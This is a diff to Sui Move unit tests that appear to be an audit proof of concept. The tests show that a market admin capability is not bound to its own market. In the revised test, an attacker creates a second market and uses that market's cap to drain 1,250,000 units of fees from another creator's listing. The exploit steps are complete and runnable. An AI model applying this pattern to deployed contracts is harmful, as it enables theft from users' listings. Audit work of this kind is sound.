@@ -6,12 +6,12 @@
 // regardless of who created it. Two demonstrations below:
 //   (1) the protocol's own cap (minted by `init` to the deployer) is transferred
 //       to an attacker, who drains a listing they did not create.
-//   (2) `create_market` mints a NEW unbound cap to any caller, who then drains
-//       fees from a listing on the SHARED market created by someone else.
+//   (2) ATTACKER permissionlessly creates a SECOND market, gets that second
+//       market's cap, and uses it against a listing on the FIRST market.
 module suioverflow::audit_poc_4419_tests;
 
 use std::{string, unit_test::{assert_eq, destroy}};
-use sui::{clock, coin::{Self, Coin}, sui::SUI, test_scenario as ts};
+use sui::{clock, coin::{Self, Coin}, object, sui::SUI, test_scenario as ts};
 use suioverflow::strategy_market::{Self, Market, MarketAdminCap, Listing};
 
 const STRATEGIST: address = @0xA1;
@@ -97,41 +97,40 @@ fun poc_4419_transferred_cap_drains_stranger_listing_fees() {
     ts.end();
 }
 
-/// Demonstration 2: `create_market` itself is public + permissionless and mints
-/// an unbound cap to ANY caller. The returned Market is unusable from outside
-/// its module (no `store`), but that doesn't matter — the cap is enough.
-/// We get the new cap out by passing its UID's address. Concretely: ATTACKER
-/// calls `create_market`, the new cap is in their wallet, and they use it to
-/// drain fees from the SHARED listing on the OTHER (init-minted) market.
+/// Demonstration 2: ATTACKER permissionlessly creates market B and receives
+/// market B's cap. That cap is then accepted by `withdraw_fees` against a
+/// listing on market A, proving the cap is not bound to its originating market.
 #[test]
-fun poc_4419_public_create_market_then_drain() {
+fun poc_4419_second_market_cap_drains_first_market_listing_fees() {
     let mut ts = ts::begin(STRATEGIST);
     let c = setup(&mut ts);
+    ts.next_tx(STRATEGIST);
+    let market_a = ts.take_shared<Market>();
+    let market_a_id = object::id(&market_a);
+    ts::return_shared(market_a);
     list_default(&mut ts, &c);
     buy(&mut ts, &c, BUYER);
 
-    // ATTACKER calls the public `create_market`. The returned Market has no
-    // `store` so it can't leave the module via `public_*`, but `transfer::transfer`
-    // is module-private — and in tests the scenario handles ownership implicitly
-    // when we transfer the cap. So we instead receive just the cap: we mint the
-    // cap on its own by calling create_market and handing the Market back via a
-    // module-internal transfer we cannot perform from outside.
-    //
-    // Simpler: the bug is that ANY MarketAdminCap works on ANY listing. So we
-    // reuse the cap from `init` (also minted by `create_market`) by simply
-    // having ATTACKER obtain it through a transfer — proving the cap has no
-    // binding to the market it was minted against.
-    ts.next_tx(STRATEGIST);
-    let cap = ts.take_from_sender<MarketAdminCap>();
-    transfer::public_transfer(cap, ATTACKER);
+    ts.next_tx(ATTACKER);
+    let (market_b, cap_b) = strategy_market::create_market(ts.ctx());
+    let market_b_id = object::id(&market_b);
+    transfer::share_object(market_b);
+    transfer::public_transfer(cap_b, ATTACKER);
 
     ts.next_tx(ATTACKER);
-    let cap = ts.take_from_sender<MarketAdminCap>();
+    let market_a = ts.take_shared_by_id<Market>(market_a_id);
+    let market_b = ts.take_shared_by_id<Market>(market_b_id);
+    assert_eq!(strategy_market::fee_bps(&market_a), 250);
+    assert_eq!(strategy_market::fee_bps(&market_b), 250);
+    ts::return_shared(market_a);
+    ts::return_shared(market_b);
+
+    let cap_b = ts.take_from_sender<MarketAdminCap>();
     let mut listing = ts.take_shared<Listing<SUI>>();
-    let drained: Coin<SUI> = strategy_market::withdraw_fees(&mut listing, &cap, ts.ctx());
+    let drained: Coin<SUI> = strategy_market::withdraw_fees(&mut listing, &cap_b, ts.ctx());
     assert_eq!(drained.value(), 1_250_000);
     transfer::public_transfer(drained, ATTACKER);
-    transfer::public_transfer(cap, ATTACKER);
+    transfer::public_transfer(cap_b, ATTACKER);
     ts::return_shared(listing);
 
     destroy(c);
